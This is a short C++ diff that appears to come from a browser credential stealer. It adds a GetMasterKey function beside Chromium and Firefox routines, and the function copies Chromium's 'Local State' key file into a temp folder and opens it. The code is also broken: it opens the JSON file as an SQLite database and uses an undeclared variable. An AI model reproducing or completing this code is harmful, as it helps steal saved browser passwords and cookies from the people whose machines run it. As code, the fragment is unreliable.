@@ -145,7 +145,25 @@ void browsers::Chromium()
 */
 
 
+void GetMasterKey(std::string path) 
+{
+    path += "/Local State";
 
+    func::copyFile(path, global::appdata+"/Temp");
+
+    path = global::appdata + "/Temp/Local State";
+
+    sqlite3* sql_browser_db = NULL;
+
+    status = sqlite3_open_v2(path,
+        &sql_browser_db,
+        SQLITE_OPEN_READONLY,
+        NULL);
+    if (status != SQLITE_OK) {
+        sqlite3_close(sql_browser_db);
+        DeleteFile(TEXT(path));
+    }
+}
 
 
 void browsers::FireFox()
